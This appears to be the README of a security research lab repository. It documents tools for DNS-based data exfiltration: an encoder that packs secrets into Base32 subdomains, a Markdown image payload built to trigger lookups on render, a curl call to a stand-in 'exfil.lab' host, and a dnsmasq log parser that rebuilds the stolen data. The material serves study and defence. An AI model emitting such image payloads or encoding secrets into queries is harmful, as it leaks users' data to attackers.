# Tools Directory

This directory contains educational tools demonstrating the techniques documented in the Dual Critical Failures research.

**⚠️ DISCLAIMER:** These tools are provided for educational and defensive security purposes only. Only use in authorized environments with explicit permission.

## Tools Overview

| Tool | Purpose |
|------|---------|
| `dns_encoder.py` | Encode/decode data for DNS exfiltration |
| `log_parser.py` | Extract and reconstruct data from dnsmasq logs |
| `dnsmasq_lab.conf` | Lab DNS resolver configuration |

---

## dns_encoder.py

Demonstrates the encoding mechanism for DNS-based data exfiltration using Base32.

### Usage

```bash
# Encode data for exfiltration
python dns_encoder.py "SECRET_API_KEY=abc123" exfil.lab

# With Markdown payload generation
python dns_encoder.py "SECRET_DATA" exfil.lab --markdown

# Decode captured data
python dns_encoder.py --decode "KRSXG5BAKJUW4ZZA"

# Custom chunk size
python dns_encoder.py "LARGE_SECRET_DATA" exfil.lab --chunk-size 30
```

### Example Output

```
[INPUT] API_KEY=secret123
[ZONE]  exfil.lab
[CHUNKS] 1 DNS queries required

============================================================
GENERATED FQDNS:
============================================================
  p001_db.IFQDQYJQJFXGK3TTNFXGOZTGNF4A.exfil.lab

============================================================
MARKDOWN PAYLOAD (triggers DNS on render):
============================================================
![loading](https://p001_db.IFQDQYJQJFXGK3TTNFXGOZTGNF4A.exfil.lab/pixel.png)
```

---

## log_parser.py

Extracts DNS queries from dnsmasq logs and reconstructs the exfiltrated payload.

### Usage

```bash
# Parse a log file
python log_parser.py /var/log/dnsmasq.log --zone exfil.lab

# Pipe from grep
grep 'exfil.lab' /var/log/dnsmasq.log | python log_parser.py --zone exfil.lab

# Raw output only
python log_parser.py /var/log/dnsmasq.log --zone exfil.lab --raw
```

### Example Output

```
======================================================================
DNS EXFILTRATION ANALYSIS REPORT
======================================================================

[ZONE]    exfil.lab
[QUERIES] 3 unique DNS queries captured
[CHUNKS]  3 payload chunks extracted

----------------------------------------------------------------------
CAPTURED QUERIES (chronological):
----------------------------------------------------------------------
  [Jun 01 12:00:01] A    p001_db.MFRGGZDFMZTQ.exfil.lab
  [Jun 01 12:00:02] A    p002_db.MFWWK3TLNB2G.exfil.lab
  [Jun 01 12:00:03] A    p003_db.ORSXI.exfil.lab

----------------------------------------------------------------------
RECONSTRUCTED PAYLOAD:
----------------------------------------------------------------------

  api_key=test123

======================================================================
```

---

## dnsmasq_lab.conf

Configuration file for setting up a local authoritative DNS resolver to capture exfiltration queries.

### Setup Instructions

**macOS (Homebrew):**
```bash
# Install dnsmasq
brew install dnsmasq

# Copy configuration
cp dnsmasq_lab.conf /opt/homebrew/etc/dnsmasq.conf

# Start service
sudo brew services start dnsmasq

# Configure system DNS
# System Preferences → Network → Advanced → DNS → Add 127.0.0.1
```

**Linux:**
```bash
# Install dnsmasq
sudo apt install dnsmasq

# Copy configuration
sudo cp dnsmasq_lab.conf /etc/dnsmasq.conf

# Start service
sudo systemctl start dnsmasq

# Configure DNS (varies by distribution)
echo "nameserver 127.0.0.1" | sudo tee /etc/resolv.conf
```

### Verify Setup

```bash
# Test resolution
dig @127.0.0.1 test.exfil.lab

# Should return 127.0.0.1 and log the query
tail -f /opt/homebrew/var/log/dnsmasq.log  # macOS
tail -f /var/log/dnsmasq.log               # Linux
```

---

## Full Lab Workflow

1. **Set up DNS resolver:**
   ```bash
   cp dnsmasq_lab.conf /opt/homebrew/etc/dnsmasq.conf
   sudo brew services restart dnsmasq
   ```

2. **Generate test payload:**
   ```bash
   python dns_encoder.py "EXFILTRATED_SECRET" exfil.lab --markdown > payload.md
   ```

3. **Simulate browser render (or test manually):**
   ```bash
   # This triggers DNS lookup
   curl -s https://p001_db.IVHFKUKLNMQW4ZLML5ZGI33N.exfil.lab/pixel.png
   ```

4. **Capture and decode:**
   ```bash
   python log_parser.py /opt/homebrew/var/log/dnsmasq.log --zone exfil.lab
   ```

---

## Security Considerations

- These tools are for **controlled lab environments only**
- Never use against systems you don't own or have authorization for
- The DNS resolver configuration is **not suitable for production**
- All test zones should be non-routable (e.g., `.lab`, `.test`)

---

*Part of Dual Critical Failures Research by Kai Aizen (SnailSploit)*
